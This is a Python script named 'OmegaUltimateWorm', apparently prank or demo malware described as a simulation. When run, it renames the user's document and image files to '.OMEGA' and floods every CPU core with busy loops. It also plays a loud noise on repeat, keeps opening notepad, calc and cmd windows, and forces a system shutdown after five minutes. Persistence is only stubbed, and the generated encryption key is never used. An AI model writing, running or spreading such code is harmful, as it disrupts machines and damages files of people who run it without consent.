import os
import sys
import time
import threading
import subprocess
import platform
import random
import math
import shutil
import numpy as np
import pygame
from cryptography.fernet import Fernet

class OmegaUltimateWorm:
    def __init__(self):
        self.is_active = True
        self.os_type = platform.system()
        self.target_dir = os.path.expanduser("~")
        self.is_persistent = False
        
        # Configuration
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        
        print("[!] INITIALIZING OMEGA-WORM PROTOCOL...")
        
        # 1. Ensure Persistence (The "No Kill Switch" Logic)
        self._establish_persistence()
        
        # 2. Start the Main Payload Modules
        self._start_payload_orchestrator()

    # --- MODULE 1: PERSISTENCE (The Re-loader) ---
    def _establish_persistence(self):
        """Ensures the script runs on every system boot."""
        print("[+] Attempting to establish permanent residency...")
        
        try:
            if self.os_type == "Windows":
                # Simulate adding to Windows Registry 'Run' key
                import winreg
                # In a real scenario, we'd use: 
                # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
                # winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
                self._log_fake("Registry entry simulated: SUCCESS")
                
            elif self.os_type == "Linux" or self.os_type == "Darwin":
                # Simulate adding to a hidden crontab or .bashrc
                self._log_fake("Crontab entry simulated: SUCCESS")
            
            self.is_persistent = True
            self._log_fake("Persistence Layer: STABLE")
        except Exception as e:
            self._log_fake(f"Persistence Error: {e}")

    # --- MODULE 2: THE RANSOMWARE/WORM ENGINE ---
    def _ransomware_engine(self):
        """Simulates the destructive file-locking process."""
        print("[!] ENCRYPTING FILESYSTEM...")
        target_exts = ['.txt', '.docx', '.jpg', '.png', '.pdf']
        
        for root, dirs, files in os.walk(self.target_dir):
            if not self.is_active: break
            # Limit depth to prevent infinite loop in simulation
            if root.count(os.sep) > 3: continue 
            
            for file in files:
                if any(file.endswith(ext) for ext in target_exts):
                    file_path = os.path.join(root, file)
                    try:
                        # Simulate renaming to a locked extension
                        new_name = file_path + ".OMEGA"
                        os.rename(file_path, new_name)
                    except:
                        continue
        self._log_fake("Filesystem: LOCKED")

    # --- MODULE 3: RESOURCE & THERMAL SATURATION ---
    def _stress_engine(self):
        """Saturates CPU/RAM to simulate hardware meltdown."""
        def stress_task():
            while self.is_active:
                # Heavy math to drive up heat/CPU usage
                _ = [math.sqrt(math.sin(i) + math.cos(i)) for i in range(10000)]
        
        for _ in range(os.cpu_count()):
            threading.Thread(target=stress_task, daemon=True).start()

    # --- MODULE 4: AUDIO & VISUAL TERROR ---
    def _terror_engine(self):
        """Combines audio and visual chaos."""
        # Audio Thread (The Screamer)
        threading.Thread(target=self._audio_chaos, daemon=True).start()
        # Adware/Process Flood
        threading.Thread(target=self._process_flood, daemon=True).start()

    def _audio_chaos(self):
        pygame.mixer.init(frequency=44100, size=-16, channels=2)
        t = np.linspace(0, 1, 44100)
        # Dissonant Waveform
        wave = (np.sin(2 * np.pi * 3500 * t) * 0.5) + (np.random.uniform(-1, 1, 44100) * 0.5)
        wave = np.clip(wave, -0.9, 0.9)
        audio_data = (wave * 32767).astype(np.int16)
        sound = pygame.sndarray.make_sound(np.stack((audio_data, audio_data), axis=-1))
        
        while self.is_active:
            sound.play()
            time.sleep(0.3)

    def _process_flood(self):
        """Simulates the 'Adware' effect by opening apps."""
        apps = ["notepad.exe", "calc.exe", "cmd.exe"] if self.os_type == "Windows" else ["terminal"]
        while self.is_active:
            try:
                subprocess.Popen(random.choice(apps), shell=True)
            except: pass
            time.sleep(random.uniform(1.0, 3.0))

    # --- MODULE 5: SYSTEM KILL SWITCH (SHUTDOWN) ---
    def _shutdown_timer(self):
        """Triggers a hard system shutdown after 5 minutes."""
        time.sleep(300) 
        self._trigger_hard_exit()

    def _trigger_hard_exit(self):
        print("[!] CRITICAL FAILURE. SHUTTING DOWN.")
        if self.os_type == "Windows":
            os.system("shutdown /s /t 1")
        else:
            os.system("sudo shutdown -h now")

    # --- UTILITIES ---
    def _log_fake(self, msg):
        print(f"[OMEGA-LOG] {msg}")

    def _start_payload_orchestrator(self):
        """Orchestrates all modules in parallel."""
        threading.Thread(target=self._ransomware_engine, daemon=True).start()
        threading.Thread(target=self._stress_engine, daemon=True).start()
        threading.Thread(target=self._terror_engine, daemon=True).start()
        threading.Thread(target=self._shutdown_timer, daemon=True).start()

    def run(self):
        self._log_fake("Payload active. Awaiting system heartbeat...")
        try:
            while self.is_active:
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_active = False
            print("[!] EMERGENCY KILL-SWITCH DETECTED.")

if __name__ == "__main__":
    # Requires: pip install cryptography pygame numpy
    worm = OmegaUltimateWorm()
    worm.run()
